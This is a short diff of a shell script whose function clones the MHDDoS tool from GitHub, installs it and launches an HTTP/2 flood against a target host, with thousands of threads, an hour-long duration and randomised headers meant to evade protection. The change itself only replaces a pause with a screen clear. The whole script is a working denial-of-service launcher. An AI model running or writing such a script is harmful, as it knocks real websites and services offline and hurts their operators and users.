@@ -12,7 +12,7 @@ task(){
   git clone "https://github.com/MatrixTM/MHDDoS.git"
   cd "MHDDoS"
   pip install -r "requirements.txt"
-  sleep 10
+  clear
   python3 start.py $target_host BYPASS 5000 3600 none none 0 256 --useragent-random --referer-random --cookie-random --host-random --delay 10 --http2
 
 }
